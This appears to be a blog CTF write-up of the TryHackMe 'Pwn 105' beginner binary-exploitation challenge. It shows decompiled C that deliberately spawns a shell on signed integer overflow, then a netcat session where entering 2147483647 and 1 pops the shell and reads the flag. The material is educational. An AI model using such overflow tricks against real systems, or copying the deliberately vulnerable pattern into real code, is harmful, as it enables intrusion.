---
author: pl4int3xt
layout: post
title: Pwn 105 - Tryhackme
date: '2024-01-20'
description: "Beginner level binary exploitation challenges from Tryhackme"
categories: [Pwn 101]
tags: [binary exploitation, Tryhackme ]
---

Let's download the binary and decompile it with ghidra. In `main()` we have `local_14 = local_18 + local_1c;`. The code checks if `local_14 < 0` the it pops a shell

```c
void main(void){
  long in_FS_OFFSET;
  uint local_1c;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  puts("-------=[ BAD INTEGERS ]=-------");
  puts("|-< Enter two numbers to add >-|\n");
  printf("]>> ");
  __isoc99_scanf(&DAT_0010216f,&local_1c);
  printf("]>> ");
  __isoc99_scanf(&DAT_0010216f,&local_18);
  local_14 = local_18 + local_1c;
  if (((int)local_1c < 0) || ((int)local_18 < 0)) {
    printf("\n[o.O] Hmmm... that was a Good try!\n",(ulong)local_1c,(ulong)local_18,(ulong)local_14)
    ;
  }
  else if ((int)local_14 < 0) {
    printf("\n[*] C: %d",(ulong)local_14);
    puts("\n[*] Popped Shell\n[*] Switching to interactive mode");
    system("/bin/sh");
  }
  else {
    printf("\n[*] ADDING %d + %d",(ulong)local_1c,(ulong)local_18);
    printf("\n[*] RESULT: %d\n",(ulong)local_14);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Basically `local_14` is the value of the added numbers and so we need to make sure they return a value that is less than 0

> In C, the `int` data type is commonly used for representing integers. The `int` type has a finite range, typically from INT_MIN to INT_MAX. If the result of an addition, subtraction, multiplication, or any other operation exceeds this range, integer overflow occurs.

We need to perform a simple `int` overflow. we know the `int` range is `-2147483647` to `2147483647`. so if we add a value to the highest `int` the sum will go to the opposite side and become a negative.

```shell
2147483647 = 01111111111111111111111111111111

01111111111111111111111111111111 + 1 = 10000000000000000000000000000000
```

Let's try that and cat the flag

```shell
pl4int3xt@archlinux ~/D/p/pwn105> nc 10.10.122.55 9005
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 105          


-------=[ BAD INTEGERS ]=-------
|-< Enter two numbers to add >-|

]>> 2147483647
]>> 1

[*] C: -2147483648
[*] Popped Shell
[*] Switching to interactive mode
ls
flag.txt
pwn105
pwn105.c
cat flag.txt
THM{REDACTED ..}
```